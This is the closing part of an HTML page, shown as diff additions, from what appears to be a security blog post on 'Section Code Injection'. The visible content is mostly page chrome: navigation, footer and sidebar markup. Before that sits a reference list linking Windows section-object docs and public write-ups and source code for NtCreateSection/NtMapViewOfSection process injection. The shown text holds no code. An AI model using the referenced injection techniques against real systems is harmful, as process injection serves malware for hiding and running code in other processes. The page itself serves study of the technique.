+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views">https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views</a></li>
+<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection">https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection</a></li>
+<li><a href="http://undocumented.ntinternals.net/">http://undocumented.ntinternals.net/</a></li>
+<li><a href="https://github.com/11philip22/CodeInjection/blob/master/SectionInjection/SectionInjection.c">https://github.com/11philip22/CodeInjection/blob/master/SectionInjection/SectionInjection.c</a></li>
+</ul>
+
+
+
+
+                <!-- Required only on API pages -->
+                <doc-toolbar-member-filter-no-results />
+            </div>
+
+            
+<nav class="flex mt-14">
+    <div class="w-1/2">
+        <a class="px-5 py-4 h-full flex items-center break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/about/">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+            <span>
+                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                <span class="block mt-1">About</span>
+            </span>
+        </a>
+    </div>
+
+    <div class="w-1/2">
+        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/writing-optimized-windows-shellcode-in-c/">
+            <span>
+                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                <span class="block mt-1">Writing Optimized Windows Shellcode in C</span>
+            </span>
+            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+        </a>
+    </div>
+</nav>
+
+
+        </main>
+
+        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+            <footer class="flex flex-wrap items-center justify-between">
+    <div>
+        <ul class="flex flex-wrap items-center text-sm">
+</ul>
+
+    </div>
+    <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"></div>
+</footer>
+
+        </div>
+    </div>
+    
+    <!-- Rendered if sidebar right is enabled -->
+    <!-- Sidebar right skeleton-->
+    <div v-cloak class="fixed top-0 bottom-0 right-0 transform translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:flex-shrink-0 lg:pt-6 lg:transform-none lg:w-56 lg:z-0 md:w-72 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+        <div class="pl-5">
+            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+        </div>
+    </div>
+    
+    <!-- User should be able to hide sidebar right -->
+    <doc-sidebar-right v-cloak></doc-sidebar-right>
+</div>
+
+        </div>
+    </div>
+
+    <doc-search-mobile></doc-search-mobile>
+    <doc-back-to-top></doc-back-to-top>
+</div>
+
+
+        <div id="docs-overlay-target"></div>
+
+        <script>window.__DOCS__ = { "title": "Section Code Injection", icon: "file", hasPrism: true, hasMermaid: false }</script>
+    </body>
+</html>
